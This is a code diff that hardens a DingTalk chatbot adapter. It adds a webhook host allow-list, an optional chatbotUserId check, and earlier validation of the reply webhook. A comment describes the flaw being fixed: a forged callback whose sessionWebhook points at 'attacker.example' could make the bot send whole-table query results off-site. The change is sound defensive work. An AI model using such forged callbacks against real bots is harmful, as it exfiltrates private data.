@@ -6,6 +6,7 @@ import {
   robotSignature,
   verifyRobotSignature,
 } from './dingtalk-crypto';
+import { stripLeadingMention } from './mention';
 import type { ChannelAdapter, DecodeResult } from './types';
 
 /**
@@ -19,6 +20,29 @@ export interface DingtalkReplyContext {
   sessionWebhookExpiredTime?: number;
 }
 
+/**
+ * sessionWebhook 允许的域。
+ *
+ * 必须校验，而且是这个 adapter 最重要的一道防线：钉钉的回调签名是
+ * `HMAC(botSecret, timestamp + "\n" + botSecret)` —— **完全不覆盖请求体**。
+ * 任何一个被观测到的合法 (timestamp, sign) 头，在容忍窗口内都能配上任意
+ * body 重放。以前这里只校验 `startsWith('https://')`，于是伪造一条
+ * `{sessionWebhook:"https://attacker.example/x", text:{content:"查询全部"}}`
+ * 就能把整张表的查询结果 POST 到攻击者的服务器。
+ *
+ * 域名对不上时返回 null，reply() 会记一条错误日志并放弃回复 ——
+ * 宁可这条消息没人收到，也不能把数据发到站外。
+ */
+const DINGTALK_WEBHOOK_HOSTS = ['oapi.dingtalk.com', 'api.dingtalk.com'];
+
+/** host 是否属于钉钉（精确匹配或其子域，避免 `oapi.dingtalk.com.evil.com` 蒙混） */
+export function isDingtalkWebhookHost(hostname: string): boolean {
+  const host = hostname.toLowerCase();
+  return DINGTALK_WEBHOOK_HOSTS.some(
+    (allowed) => host === allowed || host.endsWith(`.${allowed}`),
+  );
+}
+
 export function readDingtalkReplyContext(
   raw: unknown,
 ): DingtalkReplyContext | null {
@@ -26,6 +50,19 @@ export function readDingtalkReplyContext(
   const obj = raw as Record<string, unknown>;
   const webhook = obj.sessionWebhook;
   if (typeof webhook !== 'string' || !webhook.startsWith('https://')) {
+    return null;
+  }
+  let host: string;
+  try {
+    host = new URL(webhook).hostname;
+  } catch {
+    return null;
+  }
+  if (!isDingtalkWebhookHost(host)) {
+    console.error(
+      '[DingtalkChannel] 拒绝非钉钉域的 sessionWebhook，疑似伪造回调, host=',
+      host,
+    );
     return null;
   }
   return {
@@ -86,7 +123,8 @@ export class DingtalkChannelAdapter implements ChannelAdapter {
       };
     }
 
-    const { botSecret, robotCode } = await getDingtalkCredentials();
+    const { botSecret, robotCode, chatbotUserId } =
+      await getDingtalkCredentials();
     if (!botSecret) {
       console.warn(
         '[DingtalkChannel] 拒绝请求：未配置 botSecret，webhook 不能裸奔',
@@ -117,6 +155,22 @@ export class DingtalkChannelAdapter implements ChannelAdapter {
       };
     }
 
+    // 回调确实是发给「本机器人」的吗？
+    //
+    // 签名不覆盖 body（见 DINGTALK_WEBHOOK_HOSTS 的说明），所以 body 里的
+    // 任何字段都不可信 —— 除非能和一份只有我们和钉钉知道的配置对上。
+    // chatbotUserId 就是这份配置：它在开发者后台的机器人详情里，形如
+    // `$:LWCP_v1:$xxx`，与 robotCode 不是同一个值，所以必须单独配。
+    //
+    // 刻意做成**可选**：没配时保持原行为（只靠验签 + 时间窗 + 幂等），
+    // 不会让存量部署在升级瞬间集体失联；配了就多一道。
+    if (chatbotUserId && body.chatbotUserId !== chatbotUserId) {
+      console.warn(
+        '[DingtalkChannel] chatbotUserId 与配置不符，拒绝（疑似伪造或串了机器人）',
+      );
+      return { kind: 'reject', status: 403, reason: 'chatbotUserId 不匹配' };
+    }
+
     const msgId = body.msgId;
     if (!msgId) {
       return { kind: 'ignored', reason: '缺少 msgId（无幂等键）' };
@@ -142,20 +196,19 @@ export class DingtalkChannelAdapter implements ChannelAdapter {
           .replace(new RegExp(`^@?${escapeRegExp(robotCode)}\\s*`), '')
           .trim();
       }
-      // 剥掉开头的 "@昵称"：后面跟空白（正常情况），或者整条消息就只有这个 @
-      // （只 @ 了机器人什么都没写 —— 这时不能让 "@昵称" 残留成业务正文）。
-      // 只剥一次，所以 "@机器人 @张三的进度" 会保留后面那个 @张三。
-      content = content.replace(/^@\S+(?:\s+|$)/, '').trim();
+      content = stripLeadingMention(content);
     }
     if (!content) {
       return { kind: 'ignored', reason: '正文为空' };
     }
 
-    if (!body.sessionWebhook) {
-      // 没有 sessionWebhook 就无法回复，提前拒掉比处理完发不出去要好
+    // 没有可用的 sessionWebhook 就无法回复，提前拒掉比处理完发不出去要好。
+    // 走 readDingtalkReplyContext 而不是判空，域名校验因此发生在**执行业务
+    // 之前** —— 伪造的回调不会先把表查一遍/改一遍再卡在回复上。
+    if (!readDingtalkReplyContext(body)) {
       return {
         kind: 'ignored',
-        reason: '回调中缺少 sessionWebhook，无法回复',
+        reason: '回调中缺少可用的 sessionWebhook（缺失或非钉钉域），无法回复',
       };
     }
 
